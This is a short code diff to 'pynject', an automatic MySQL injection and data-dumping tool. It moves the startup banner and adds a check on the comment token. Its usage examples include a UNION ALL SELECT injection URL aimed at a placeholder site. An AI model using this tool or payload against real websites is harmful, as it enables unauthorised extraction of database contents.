@@ -177,12 +177,6 @@ class Pynject:
         self.records = {}
         self.query   = None
         self.data    = None
-        self.banner()
-        
-    def banner(self):
-        print( "\n\tpynject 1.0 - An automatic MySQL injector and data dumper tool.\n" +
-               "\tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n" +
-               "\thttp://www.evilsocket.net\n\n" );
 
     def execQuery( self, query ):
         print( "@ Executing user query ." )
@@ -465,6 +459,10 @@ class Report:
      
 if __name__ == '__main__':
     try:
+        print( "\n\tPynject 1.0 - An automatic MySQL injector and data dumper tool.\n" +
+               "\tCopyleft Simone Margaritelli <evilsocket@gmail.com>\n" +
+               "\thttp://www.evilsocket.net\n\n" );
+               
         parser = OptionParser( usage = "usage: %prog [options] [action] [output method]\n\n" +
                                        "EXAMPLES:\n" +
                                        "\t%prog -u 'http://www.site.com/news.php?id=1%20AND%201=2%20UNION%20ALL%20SELECT%20NULL,####,NULL,NULL--' -m '####' --dbs\n" +
@@ -506,6 +504,8 @@ if __name__ == '__main__':
             parser.error( "No url specified." )
         elif o.marker == None:
             parser.error( "No marker specified." )
+        elif o.comment != None and o.url.find(o.comment) == -1:
+            parser.error( "The comment token '{0}' was not found in the given url, please specify a valid comment with the --comment directive.".format(o.comment) )
         elif o.url.find(o.marker) == -1:
             parser.error( "Invalid marker, not found in given url." )
         elif o.action == None and o.query == None:
